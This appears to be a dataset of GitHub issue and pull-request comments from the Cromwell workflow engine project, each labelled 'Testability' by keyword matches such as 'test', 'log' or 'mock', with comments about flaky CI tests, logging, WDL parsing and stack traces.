Testability,@mcovarr still a problem with the restart tests?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-324471614:42,test,tests,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-324471614,1,['test'],['tests']
Testability,@mcovarr tested manually and it does appear to make it through,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4993#issuecomment-495400504:9,test,tested,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4993#issuecomment-495400504,1,['test'],['tested']
Testability,@mcovarr that was indeed my theory. I'm trying to create a test case to actually reproduce this error to make sure my fix doesn't have some other weird downstream problems (eg getting 10 lines later then throw some other exception wouldn't be a great outcome),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4909#issuecomment-488082964:59,test,test,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4909#issuecomment-488082964,1,['test'],['test']
Testability,"@mcovarr to my point, restarting both resulted in 1 passing. Hooray for deterministic testing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3989#issuecomment-411633460:86,test,testing,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3989#issuecomment-411633460,1,['test'],['testing']
Testability,@mcovarr would you be content if I made a mock `PipelinesApiRequestWorker` that always crashes and check that the manager handles it?. I'm also thinking about introducing error types at this interface in the stack so that explosions in Google code don't percolate into Cromwell; ```; at com.google.api.client.googleapis.batch.BatchRequest.execute(BatchRequest.java:233); at cromwell.backend.google.pipelines.common.api.PipelinesApiRequestWorker.runBatch(PipelinesApiRequestWorker.scala:59); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4917#issuecomment-492863137:42,mock,mock,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4917#issuecomment-492863137,1,['mock'],['mock']
Testability,"@mcovarr yeah, when I ran this I got `Succeeded but expected Failed` which seemed odd - hence the ""Fix/Investigate Test"" rather than ""Missing Functionality""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224282366:115,Test,Test,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224282366,1,['Test'],['Test']
Testability,"@mcovarr you're right... the more real-ish paths would be. ```; gs://<executions>/hello/e6236763-c518-41d0-9688-432549a8bf7c/call-hello/e6236763-hello.log; ```. I hear that people will be copying these files into a single directory, so we shouldn't clobber files. Having the workflow ID in the filename will make it so logs of multiple workflows can exist in a single directory. If that's not a use case we're trying to solve right now then I'm all for removing the short ID from the filename.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/378#issuecomment-171691530:151,log,log,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/378#issuecomment-171691530,2,['log'],"['log', 'logs']"
Testability,"@mcovarr: ; > how do these changes enable WDL 1.0 support. It replaces the use of WDL draft 2 objects to build a graph with the use of WOM objects to build the graph. > or the tests confirm that support has been added?. The tests make sure that the examples in the `womtool validate` test suite (which includes WDL draft-2 and 1.0) also run to completion in `womtool graph`. It doesn't assert that the output is _correct_ per se, but it does check that the process exits with a non-failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5326#issuecomment-567208623:176,test,tests,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5326#issuecomment-567208623,4,"['assert', 'test']","['assert', 'test', 'tests']"
Testability,"@myazinn Ah, I see. Sorry - I had assumed that you spotted a flakey test and were fixing that as well",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519665821:68,test,test,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519665821,1,['test'],['test']
Testability,"@myazinn Hmm sorry - I was just looking for another example of something using `cwl.inputs.json` and figured that this **should** work on a cloud backend, but I was just looking by eye. Ultimately the real test is if you can run the stuff described by @chapmanb in #4586",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5097#issuecomment-518352796:206,test,test,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5097#issuecomment-518352796,1,['test'],['test']
Testability,@myazinn That's great! I will run the tests again.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-524382440:38,test,tests,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-524382440,1,['test'],['tests']
Testability,"@myazinn You can restart the tests by going to the ""checks"" tab on this PR and restarting failed tests that way, no need to reset the PR. We do have a number of flaky tests, unfortunately. There are a lot of things which rely on timing in a concurrent environment which we haven't rooted out. I'm pretty skeptical that the test fix you pushed is actually correct unless it very recently changed - more likely is that something is timing out before the test can properly complete and the incorrect value is coming through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519088990:29,test,tests,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519088990,5,['test'],"['test', 'tests']"
Testability,"@myazinn our current course of action is to revert your PR (in this PR) but you are encouraged to submit a revised version of #5104, we even have tests for the functionality that regressed so it will not be possible to break the same thing again.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5183#issuecomment-534122855:146,test,tests,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5183#issuecomment-534122855,1,['test'],['tests']
Testability,@natechols we are currently releasing every 3 weeks and next week is when we are aiming to release 41. We'll make sure to circle back to this PR and work with you on what to test when we have more time. The goal would be to get this released in 42 if all goes well!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-488378799:174,test,test,174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-488378799,1,['test'],['test']
Testability,"@nvanaja. > Inadvertently did merge instead of rebase. Hope it's ok. [It worked!](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-aws/918/console) (still an internal-only link though). > Tried rerunning. It passed. Yeah... that's unfortunately cromwell's flaky tests. See BT-117 that's looking to help. Thanks for your patience and the retry. > Would it be possible to share the internal failed test. No. Cromwell CI that runs under 3 hours is run on Travis CI. For over 3 hours cromwell uses the notoriously insecure Jenkins CI hosted by friends of ours in DSP. This was all set up before GitHub Actions existed. 🧓 Perhaps one day we'll move those tests where contributors like yourself can see the results, but afaik there are no current plans to do so. > I would like to run it locally in my workspace if possible. This is technically possible but isn't currently supported, and we'd have to all loop in our AppSec & DevOps folks to discuss further. In the short term hopefully you can put up with us as the folks-in-the-middle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006:283,test,tests,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006,3,['test'],"['test', 'tests']"
Testability,"@orodeh @geoffjentry this is probably a case where the WDL spec has failed to keep up with developments in Cromwell. What's awkward in this case is I think Cromwell could be argued to be overreaching and adding things that **should not** be in the WDL spec!. I'd be fine to remove this as a ""bug fix"", but you'll still need to ""fix"" the test case before I can merge it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342542308:337,test,test,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342542308,1,['test'],['test']
Testability,@orodeh I would probably start with something in `WdlFileToWomSpec`. If you wanted to do that you'll probably need to find a way to customize the configuration for just that test case,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-510842794:174,test,test,174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-510842794,1,['test'],['test']
Testability,"@orodeh in case you're not able to read the Travis output, the build failure is currently being caused by:; ```; [0m[[0minfo[0m] [0m[31m*** 1 TEST FAILED ***[0m[0m; [0m[[0minfo[0m] [0m[31mWdlSubworkflowWomSpec:[0m[0m; [0m[[0minfo[0m] [0m[31mWdlNamespaces with subworkflows [0m[0m; [0m[[0minfo[0m] [0m[31m- should support WDL to WOM conversion of subworkflow calls *** FAILED *** (51 milliseconds)[0m[0m; [0m[[0minfo[0m] [0m[31m wdl4s.parser.WdlParser$SyntaxError: ERROR: out is declared as a Array[String] but the expression evaluates to a String:[0m[0m; [0m[[0minfo[0m] [0m[31m[0m[0m; [0m[[0minfo[0m] [0m[31m Array[String] out = inner.out[0m[0m; [0m[[0minfo[0m] [0m[31m ^[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.$anonfun$typeCheckDeclaration$1(WdlNamespace.scala:493)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.Option.flatMap(Option.scala:171)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.typeCheckDeclaration(WdlNamespace.scala:488)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.validateDeclaration(WdlNamespace.scala:466)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.$anonfun$apply$35(WdlNamespace.scala:381)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:241)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.Iterator.foreach(Iterator.scala:929)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.Iterator.foreach$(Iterator.scala:929)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.AbstractIterator.foreach(Iterator.scala:1417)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.IterableLike.foreach(IterableLike.scala:71)[0m[0m; ```. I'm not sure whether you intended to roll back that change at the same time as rolling back the test case? I think we can argue to make the set of coercions explicit in draft 3 (and not include `X => Array[X]`), but IMO we shouldn't ""unsupp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342278838:147,TEST,TEST,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342278838,1,['TEST'],['TEST']
Testability,"@orodeh yeah, I wouldn't worry about that (it sounds like a hash was changed in quay.io for the first time in 2 years and it broke that test. Nothing for us to worry about in this PR!). I'll wait for the tests to complete again and as long as it's still looking good, I'll merge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370594386:136,test,test,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370594386,2,['test'],"['test', 'tests']"
Testability,"@pgrosu Thanks for reminding me about that ticket - there's definitely a bug somewhere but I think it's an artifact of using mock-jes and I was never able to replicate it so it's hard to say what was going on. What I saw in the database _should_ be impossible to have achieved, joy ;). I'm definitely aware of this sort of stuff, if our goal was pure scale you'd see a pretty different design to things. The goal is to be flexible enough to respond to scale demands as they increase. To date the folks that set our priorities for us have consistently set the bar for scale to be just enough to manage what we need to handle internally - as you note this means there's always more to squeeze out. . At the moment the plan is to loop back to scaling in the next quarter, but we're still talking about what we project for Broad's sequencing production (which really means ""how big of a joint genotyping run does daniel macarthur want to run this time?"") and a projection of firecloud usage for a relatively near-mid term horizon.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261786552:125,mock,mock-jes,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261786552,1,['mock'],['mock-jes']
Testability,@pshapiro4broad just want to be sure you'll be adding the Centaur tests?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-461842716:66,test,tests,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-461842716,1,['test'],['tests']
Testability,"@pshapiro4broad would you be able to provide (even just in theory) a WDL which could, test that this is working? Maybe with a short ""and then you'd want to check this value to make sure""piece of commentary?. If so, I bet we could wire the test into our testing framework on your behalf and merge this",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-469445872:86,test,test,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-469445872,3,['test'],"['test', 'testing']"
Testability,@pshapiro4broad you flatter me. But yeah we should probably come up w/ a centaur test that makes sure it is actually working as intended. The good news is that our travis PR tests conduct a whole battery of papi v2 tests and those pass so this didn't break anything :smile:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460273110:81,test,test,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460273110,3,['test'],"['test', 'tests']"
Testability,@rebrown1395 - This appears to be related to a previous issue with the public dataset bucket for `gatk-test-data` which has been resolved.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4321#issuecomment-445973135:103,test,test-data,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4321#issuecomment-445973135,1,['test'],['test-data']
Testability,"@rhpvorderman oh, I didn't notice your comment about the tests in my re-review. Hmm, that's an interesting problem - since centaur runs in server mode I don't think you'd see an exit code. Does any failure data end up in Cromwell's metadata when this copy fails? If so, centaur can query for the metadata entry",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482345386:57,test,tests,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482345386,1,['test'],['tests']
Testability,"@rhpvorderman we can't merge with cancelled tests, but if you only change documentation, our CI should be able to spot that and only run a minimal set (see https://github.com/broadinstitute/cromwell/blob/develop/src/ci/bin/test.inc.sh#L144... we might need to add `CHANGELOG.MD` to that pattern match)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628065940:44,test,tests,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628065940,2,['test'],"['test', 'tests']"
Testability,"@robthompsonweb as i understand, you expect the output.txt to be a file(not a directory) located at ""s3://3-bucket/WGS_BAM_to_GVCF/workflow/call-MergeGVCFs/output.txt/ and logs at s3://s3-bucket/wf_logs. Am i right?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-516827202:172,log,logs,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-516827202,1,['log'],['logs']
Testability,"@rsasch it was a test issue - they were asking for the lexer to tokenize WDL expressions like `3 + 3` in the ""default"" lexing mode. What went wrong was that I changed the ""default"" mode and moved almost all of its content into a new ""main"" mode. So the fix was: make sure the lexer gets put into ""main"" mode before it tries to tokenize the expressions that we're testing for by first getting it to tokenize the ""version 1.0"" (which has the side-effect of changing the lexer's mode)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3968#issuecomment-410364591:17,test,test,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3968#issuecomment-410364591,2,['test'],"['test', 'testing']"
Testability,"@rsasch that's exactly what i'm talking about. we do that everywhere, but akka can be configured to log those automatically. if an unhandled message catcher is doing something useful other than logging, that's different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-430029351:100,log,log,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-430029351,2,['log'],"['log', 'logging']"
Testability,"@rtitle ; The real meat of this ticket though is less the ""omg the DB barfed"" but rather ""omg we don't do anything smart when omg the DB barfed"" :). That said, the bulk of our data storage *is* separated out, just not practically in our default ""Jane User"" configuration. Currently the ""Jane User"" configuration is the only one which exists. So e.g. for CaaS that's not going to be the case, and we'll probably need to support horizontal scaling scenarios that don't take adantage of GCP tooling for external customers as well. . The lion's share of our DB activity consists of writes coming from the write side of our cqrs to the read side's event store and reads on that event store coming from the API. It's logically all separated out but in stock Cromwell they're sharing the same DB/connection/etc. So e.g. one possibility (which has come up before for other reasons) would be to make it easier for a user to bifurcate those to using separate DBs (or at least separate connections), although you'd still possibly have this problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316435999:711,log,logically,711,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316435999,1,['log'],['logically']
Testability,"@ruchim @Horneth @aednichols I'm seeing this error pop up running cromwell-35 on SGE, except the timeout is at 60 seconds rather than 10. The error gets repeated a number of times (in the latest log it appears 9 times). The output in question is a glob and there are 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(Fo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:195,log,log,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,1,['log'],['log']
Testability,"@ruchim @geoffjentry . Hi, ; Sorry, it looks like I copied the wrong history. I added the correct history at https://gist.github.com/denis-yuen/b3aa8b0e882dee1fe8cb6cab82286e46. The error message is pretty similar, is it possible #4308 affects both scenarios?. Equivalent excerpts below:; ```; dyuen@odl-dyuen2:~/test$ git clone https://github.com/dockstore-testing/dockstore-workflow-md5sum-unified.git; Cloning into 'dockstore-workflow-md5sum-unified'...; remote: Enumerating objects: 113, done.; remote: Total 113 (delta 0), reused 0 (delta 0), pack-reused 113; Receiving objects: 100% (113/113), 24.79 KiB | 1.24 MiB/s, done.; Resolving deltas: 100% (50/50), done.; dyuen@odl-dyuen2:~/test$ cd dockstore-workflow-md5sum-unified; dyuen@odl-dyuen2:~/test/dockstore-workflow-md5sum-unified$ cwltool checker_workflow_wrapping_workflow.cwl md5sum.json; /usr/local/bin/cwltool 1.0.20180403145700; Resolved 'checker_workflow_wrapping_workflow.cwl' to 'file:///home/dyuen/test/dockstore-workflow-md5sum-unified/checker_workflow_wrapping_workflow.cwl'; <snip>; Final process status is success; dyuen@odl-dyuen2:~/test/dockstore-workflow-md5sum-unified$ wget https://github.com/broadinstitute/cromwell/releases/download/36/cromwell-36.jar; --2018-11-09 10:24:06-- https://github.com/broadinstitute/cromwell/releases/download/36/cromwell-36.jar; <snip>; 2018-11-09 10:24:25 (9.05 MB/s) - ‘cromwell-36.jar’ saved [175930401/175930401]. dyuen@odl-dyuen2:~/test/dockstore-workflow-md5sum-unified$ java -jar cromwell-36.jar run checker_workflow_wrapping_workflow.cwl --inputs md5sum.json; [2018-11-09 10:25:13,02] [info] Running with database db.url = jdbc:hsqldb:mem:563ca6aa-5d9b-4e8f-b0c6-f3901066317d;shutdown=false;hsqldb.tx=mvcc; [2018-11-09 10:25:18,31] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-11-09 10:25:18,32] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-11-09 10:25:18,39] [info] Running with database d",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477:313,test,test,313,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477,5,['test'],"['test', 'testing']"
Testability,"@ruchim I should clarify. There are a lot of people at this workshop (if not all of them) that cannot use the cloud, due to regulations, clinical requirements, etc. Or they need to be able to run WDL on their local on-prem compute cluster for testing on small cohorts, etc. This is a common configuration that prohibits docker. We really do not want these users to be forced to change the WDL that we (DSP methods) write and test. In order to stay backend-agnostic, can we implement a null option for docker as described in this issue (and #1804 )?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423147605:243,test,testing,243,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423147605,2,['test'],"['test', 'testing']"
Testability,"@ruchim I updated the description and title, this is not nearly as bad as the previous title made it sound. It's a very weird case found in the centaur test failures that I'm looking at.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4202#issuecomment-427022611:152,test,test,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4202#issuecomment-427022611,1,['test'],['test']
Testability,"@ruchim I was trying to follow the code path and it does seem that I see the effect of line 1012 in the logs:; https://github.com/broadinstitute/cromwell/blob/develop/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L1012. but can't see the effect of line 1013 in the metadata, until many hours later ... maybe some contention handling / regulating code? I don't yet understand how MetadataBuilderRegulatorActor works but could this be involved?. ```; jobLogger.info(s""Status change from $prevStatusName to $state""); tellMetadata(Map(CallMetadataKeys.BackendStatus -> state)); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-447295280:104,log,logs,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-447295280,1,['log'],['logs']
Testability,"@ruchim Thanks alot for looking into this, I have not really had bandwidth to get those Operation logs yet, I can look into it later today hopefully",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628552:98,log,logs,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628552,1,['log'],['logs']
Testability,"@ruchim That's fine, this isn't blocking me right now, as long as I have something to tell my boss. However if someone has time to suggest what tests I should add for Postgresql, I can try to have those added by the time you're ready to review the entire mess. (Or should it just be everything you're testing for MySQL? This seems easy enough to add but I'm nervous about bloating your travis-ci runtimes.). Just out of curiosity, what is the timeline for Cromwell releases this year? I am fine using my fork for now but eventually we want to be able to use the official jarfile.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-488330109:144,test,tests,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-488330109,2,['test'],"['testing', 'tests']"
Testability,@ruchim so I assume they want the tests to run when running assembly ? Also is this file only used by gotc ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1507#issuecomment-250560524:34,test,tests,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1507#issuecomment-250560524,1,['test'],['tests']
Testability,@salonishah11 I believe we now have upgrade tests in our CI which would catch that. @mcovarr @kshakir does that sound right?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-490140739:44,test,tests,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-490140739,1,['test'],['tests']
Testability,"@salonishah11 we do [already](https://github.com/broadinstitute/cromwell/blob/a70b4fd071ac05f515bf1a9a96155a19acc145b3/engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala#L448) have a logged message ""Successfully deleted intermediate output file(s) for root workflow $rootWorkflowIdForLogging."" So unless we want to log a message for each individual file (which seems like it could be a lot… but maybe useful information?), I think we are already set with that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150:199,log,logged,199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150,2,['log'],"['log', 'logged']"
Testability,"@salonishah11 with a goal of getting this code back in `develop`, I'm gonna let CI run a couple times and check logs for `Cromwell failed to progress` messages. It has been a mystery exactly what the problem is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6706#issuecomment-1064607797:112,log,logs,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6706#issuecomment-1064607797,1,['log'],['logs']
Testability,"@scottfrazer . Let's discuss off github if you'd like to go in depth. There's more background in the original JES docs too. In short for now:; 1. I can't get all the ""logic"" terminology correct here (a Fruit is not necessarily an Apple), but shared variously between `RuntimeAttributes` and `JesBackend`, `local-disk` is `LocalWorkingDiskValue` is `working_disk` is `/cromwell_root`.; 2. Additional mount points are not input or captured anywhere within cromwell. So, if you _try to_ mount a second disk, cromwell never finishes setting the JES parameters for where to mount the freshly attached drive. This PR tries not to break this existing ""functionality"", while also allowing one to effectively increase the size of `/cromwell_root`. I'm leaving it to another ticket to discuss how this should be enhanced.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/257#issuecomment-151500542:167,log,logic,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/257#issuecomment-151500542,1,['log'],['logic']
Testability,"@scottfrazer @mcovarr I think your two remaining comments are related - having some tests for this, and replacing the existing WMA with the new version. I'd lobby for doing them together in the very next ticket I'm picking up - i.e. #692",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-208964105:84,test,tests,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-208964105,1,['test'],['tests']
Testability,"@scottfrazer IIRC the original use case specified that one turned on workflow logging via workflow option, not at a server level",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188440895:78,log,logging,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188440895,1,['log'],['logging']
Testability,"@scottfrazer So the reason I'm asking about the required functionality and JES (and asked if the main issue was the eventual annoying rebase if this isn't merged) is that my concern is that this is a hefty change mid-sprint when we're already concerned w/ the hairiness of our actual sprint goals. For instance what if this causes some unforeseen issue which causes the s/g to not be complete this sprint. We can handwave all we want about what is truly important or not but the only official metric of importance is what's in our sprint and if this disrupts that's no bueno - and regardless of our confidence level there _is_ a risk here. I suppose we could back it out but that'd still likely end up having been a big time disruption at that point. I would feel a lot more comfortable if a large body of WDL was run against JES backend (and Local too, really - though that's less worrisome) - it'd have been nice if someone decided the integration test battery was important enough to work on the side ;) If people have actually been listening to my requests to paste their interesting WDLs on that ticket that'd be a good start, but double check with @cjllanwarne as he wrote a WDL to exercise all the various functionality we supported at the time. . Actually what'd be really awesome is if you could run the WDL they're using for the demo as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134756661:950,test,test,950,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134756661,1,['test'],['test']
